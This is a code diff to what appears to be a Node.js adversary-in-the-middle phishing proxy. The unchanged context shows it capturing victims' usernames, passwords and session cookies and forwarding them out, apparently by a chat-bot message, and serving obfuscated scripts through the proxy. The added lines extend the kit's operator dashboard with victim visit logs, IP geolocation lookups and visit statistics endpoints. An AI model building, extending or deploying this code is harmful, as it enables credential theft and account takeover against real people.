@@ -23,6 +23,16 @@ async function getGeoInfo(ip) {
     }
 }
 
+// Added: Quick country code lookup for visits
+async function getCountryCode(ip) {
+    try {
+        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode`);
+        return response.data.countryCode || 'UN';
+    } catch {
+        return 'UN';
+    }
+}
+
 function getFlagEmoji(countryCode) {
     if (!countryCode || countryCode.length !== 2) return '🌍';
     return String.fromCodePoint(
@@ -164,7 +174,6 @@ ${flag} **Location:** ${location}
 
         // Add credentials if found
         if (hasCredentials && body) {
-            // Try to extract username and password
             let username = 'N/A';
             let password = 'N/A';
             
@@ -207,7 +216,6 @@ ${flag} **Location:** ${location}
             parse_mode: 'Markdown'
         });
 
-        // Send cookies as file if available
         const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
         if (cookies) {
             await sendCookiesAsFile(cookies, sessionId);
@@ -242,13 +250,26 @@ if (!fs.existsSync(VISITS_LOG_DIR)) {
     fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
 }
 
-// Function to log a visit
+// Function to log a visit (with country code)
 async function logVisit(clientRequest, clientResponse, sessionId) {
+    const ip = clientRequest.headers['x-real-ip'] || 
+               clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+               'Unknown';
+    
+    // Get country code from IP
+    let countryCode = 'UN';
+    if (ip !== 'Unknown') {
+        try {
+            countryCode = await getCountryCode(ip);
+        } catch (e) {
+            // Default to UN if lookup fails
+        }
+    }
+    
     const visit = {
         timestamp: new Date().toISOString(),
-        ip: clientRequest.headers['x-real-ip'] || 
-             clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-             'Unknown',
+        ip: ip,
+        countryCode: countryCode,
         userAgent: clientRequest.headers['user-agent'] || 'Unknown',
         referer: clientRequest.headers['referer'] || 'Direct',
         sessionId: sessionId || 'unknown',
@@ -760,6 +781,79 @@ dashApp.post('/api/webmail/search', async (req, res) => {
 });
 
 // ================================================
+// 📊 VISITS API ENDPOINTS
+// ================================================
+
+// ---------- API: Get visits ----------
+dashApp.get('/api/visits', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        if (!fs.existsSync(VISITS_LOG_FILE)) {
+            return res.json({ visits: [], total: 0, uniqueIPs: 0, today: 0, week: 0 });
+        }
+        
+        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const visits = lines.map(line => JSON.parse(line));
+        
+        // Sort by timestamp (newest first)
+        visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+        
+        // Count unique IPs
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        
+        // Count visits today and this week
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        
+        res.json({
+            visits: visits.slice(0, 100),
+            total: visits.length,
+            uniqueIPs: uniqueIPs,
+            today: todayVisits.length,
+            week: weekVisits.length
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ---------- API: Get visit stats (summary) ----------
+dashApp.get('/api/visits/stats', (req, res) => {
+    try {
+        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
+        if (!fs.existsSync(VISITS_LOG_FILE)) {
+            return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
+        }
+        
+        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        const visits = lines.map(line => JSON.parse(line));
+        
+        const now = new Date();
+        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
+        
+        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
+        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
+        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
+        
+        res.json({
+            total: visits.length,
+            uniqueIPs: uniqueIPs,
+            today: todayVisits.length,
+            week: weekVisits.length
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// ================================================
 // 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁
 // ================================================
 
@@ -774,7 +868,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
         return;
     }
 
-    logVisit(clientRequest, clientResponse, currentSession || 'new');
+    // Log the visit asynchronously (don't await, fire and forget)
+    logVisit(clientRequest, clientResponse, currentSession || 'new').catch(() => {});
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
@@ -804,7 +899,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
-            // ✅ FIXED: Service workers cannot use eval() - serve unobfuscated
+            // Service workers cannot use eval() - serve unobfuscated
             clientResponse.writeHead(200, {
                 'Content-Type': 'text/javascript',
                 'Cache-Control': 'no-store'
@@ -922,7 +1017,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                         }
 
                                         else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
-                                            // Obfuscated script (eval is allowed here)
                                             const obfKey = generateObfuscationKey();
                                             const obfuscatedCode = obfuscateJSFile(PROXY_FILES.script, obfKey);
                                             clientResponse.writeHead(200, {
@@ -1710,7 +1804,6 @@ app.use('/dash', dashApp);
 
 // Mount the proxy on the root path, but SKIP /dash
 app.use((req, res) => {
-    // Only handle non-/dash routes with the proxy
     if (!req.path.startsWith('/dash')) {
         proxyServer.emit('request', req, res);
     }
